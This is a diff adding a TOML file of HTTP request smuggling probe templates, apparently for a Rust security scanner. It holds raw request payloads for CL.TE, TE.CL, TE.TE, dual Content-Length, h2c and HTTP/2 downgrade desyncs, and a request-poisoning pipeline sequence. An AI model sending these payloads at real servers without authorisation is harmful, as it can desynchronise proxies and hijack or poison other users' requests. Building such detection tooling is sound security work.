@@ -1,0 +1,273 @@
+# TOML Probe Templates for HTTP Request Smuggling
+#
+# Schema:
+#   [[probe]]
+#   id          = unique string identifier
+#   variant     = "ClTe" | "TeCl" | "TeTe" | "H2c" | "WebSocket" | "ClZero" | "DualCl" | "ChunkExtension" | "H2Cl" | "H2Te" | "Pipeline"
+#   description = human-readable description
+#   method      = HTTP method
+#   path        = request path
+#   headers     = list of { name, value }
+#   body        = request body (may contain \r\n escapes)
+#   requires_feature = optional cargo feature gate (e.g., "unsafe-probes")
+
+[[probe]]
+id = "cl-te-zero"
+variant = "ClTe"
+description = "Classic CL.TE with Content-Length: 0"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "0" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "0\r\n\r\n{{prefix}}"
+
+[[probe]]
+id = "te-cl-short"
+variant = "TeCl"
+description = "Classic TE.CL with short Content-Length"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "4" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "5\r\nGPOST\r\n0\r\n\r\n"
+
+[[probe]]
+id = "te-te-obfuscated"
+variant = "TeTe"
+description = "TE.TE with tab-obfuscated Transfer-Encoding"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "0" },
+    { name = "Transfer-Encoding", value = "\tchunked" },
+]
+body = "0\r\n\r\n{{prefix}}"
+
+[[probe]]
+id = "cl-zero-body"
+variant = "ClZero"
+description = "Content-Length: 0 with a hidden body"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "0" },
+]
+body = "{{prefix}}"
+
+[[probe]]
+id = "dual-cl"
+variant = "DualCl"
+description = "Dual Content-Length headers with conflicting values"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "6" },
+    { name = "Content-Length", value = "5" },
+]
+body = "{{prefix}}"
+
+[[probe]]
+id = "chunk-extension"
+variant = "ChunkExtension"
+description = "Chunked body with extension to bypass length checks"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "1;ext=foo\r\nX\r\n0\r\n\r\n{{prefix}}"
+
+[[probe]]
+id = "h2c-upgrade"
+variant = "H2c"
+description = "H2C cleartext upgrade tunneling"
+method = "GET"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Connection", value = "Upgrade, HTTP2-Settings" },
+    { name = "Upgrade", value = "h2c" },
+    { name = "HTTP2-Settings", value = "AAMAAABkAARAAAAAAAIAAAAA" },
+]
+body = ""
+
+[[probe]]
+id = "h2c-upgrade-only"
+variant = "H2c"
+description = "H2C upgrade without HTTP2-Settings header"
+method = "GET"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Connection", value = "Upgrade" },
+    { name = "Upgrade", value = "h2c" },
+]
+body = ""
+
+[[probe]]
+id = "websocket-upgrade"
+variant = "WebSocket"
+description = "WebSocket upgrade tunneling"
+method = "GET"
+path = "/chat"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Connection", value = "Upgrade" },
+    { name = "Upgrade", value = "websocket" },
+    { name = "Sec-WebSocket-Key", value = "dGhlIHNhbXBsZSBub25jZQ==" },
+    { name = "Sec-WebSocket-Version", value = "13" },
+]
+body = ""
+
+[[probe]]
+id = "get-body-smuggle"
+variant = "MethodBody"
+description = "GET request with a body to test method-specific parsing"
+method = "GET"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "{{prefix_len}}" },
+]
+body = "{{prefix}}"
+
+[[probe]]
+id = "http10-keepalive"
+variant = "Http10"
+description = "HTTP/1.0 keep-alive persistence disagreement"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Connection", value = "keep-alive" },
+    { name = "Content-Length", value = "{{prefix_len}}" },
+]
+body = "{{prefix}}"
+
+[[probe]]
+id = "pipeline-poison"
+variant = "Pipeline"
+description = "Pipeline sequence: poison followed by victim request"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "0" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "0\r\n\r\n{{prefix}}"
+
+[[probe]]
+id = "h2-cl-downgrade"
+variant = "H2Cl"
+description = "HTTP/2 request carrying Content-Length for H2->H1 desync"
+method = "POST"
+path = "/"
+headers = [
+    { name = ":method", value = "POST" },
+    { name = ":path", value = "/" },
+    { name = ":scheme", value = "https" },
+    { name = ":authority", value = "{{host}}" },
+    { name = "content-length", value = "6" },
+]
+body = "hello\n"
+
+[[probe]]
+id = "h2-te-downgrade"
+variant = "H2Te"
+description = "HTTP/2 request carrying Transfer-Encoding for H2->H1 desync"
+method = "POST"
+path = "/"
+headers = [
+    { name = ":method", value = "POST" },
+    { name = ":path", value = "/" },
+    { name = ":scheme", value = "https" },
+    { name = ":authority", value = "{{host}}" },
+    { name = "transfer-encoding", value = "chunked" },
+]
+body = ""
+
+[[probe]]
+id = "trailer-injection"
+variant = "ChunkExtension"
+description = "Chunked body with trailer headers"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Transfer-Encoding", value = "chunked" },
+    { name = "Trailer", value = "X-Trailer" },
+]
+body = "0\r\nX-Trailer: injected\r\n\r\n"
+
+[[probe]]
+id = "h2c-post-body"
+variant = "H2c"
+description = "H2C upgrade with a POST body"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Connection", value = "Upgrade, HTTP2-Settings" },
+    { name = "Upgrade", value = "h2c" },
+    { name = "HTTP2-Settings", value = "AAMAAABkAARAAAAAAAIAAAAA" },
+    { name = "Content-Length", value = "4" },
+]
+body = "test"
+
+[[probe]]
+id = "detect-cl-te"
+variant = "DetectClTe"
+description = "Safe timing probe for CL.TE detection"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "6" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "0\r\nX\r\n"
+
+[[probe]]
+id = "detect-te-cl"
+variant = "DetectTeCl"
+description = "Safe timing probe for TE.CL detection"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "4" },
+    { name = "Transfer-Encoding", value = "chunked" },
+]
+body = "5\r\n\r\n0\r\n\r\n"
+
+[[probe]]
+id = "cl-obfuscation-plus"
+variant = "ClObfuscation"
+description = "Content-Length with plus sign prefix"
+method = "POST"
+path = "/"
+headers = [
+    { name = "Host", value = "{{host}}" },
+    { name = "Content-Length", value = "+5" },
+]
+body = "{{prefix}}"
+
+[[probe]]
+id = "http09-simple"
+variant = "Http09"
+description = "HTTP/0.9 simple-request downgrade"
+method = "GET"
+path = "/"
+headers = []
+body = "{{prefix}}"
